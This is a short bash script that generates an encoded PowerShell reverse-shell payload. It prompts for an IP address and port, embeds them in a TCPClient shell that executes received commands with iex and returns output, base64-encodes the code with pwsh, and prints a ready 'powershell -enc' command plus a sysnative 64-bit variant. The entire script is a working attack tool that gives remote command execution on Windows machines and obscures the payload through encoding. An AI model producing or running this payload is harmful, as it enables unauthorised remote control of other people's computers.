#!/bin/bash

ip -c a
echo
echo
echo "Enter your IP address"
read ip
echo
echo "Enter the port number"
read port
echo
echo "The following is an Encoded PS payload"

text="\$Text = '\$client = New-Object System.Net.Sockets.TCPClient(\"$ip\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()'"

ops='$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text); $EncodedText =[Convert]::ToBase64String($Bytes); $EncodedText'

payload=$(echo "$text; $ops" | pwsh -Command -)
echo
echo "powershell -enc $payload"
echo
echo "To ensure it's a 64-bit process, can try the following syntax. Basic Syntax is more reliable though!"
echo 'C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -enc'
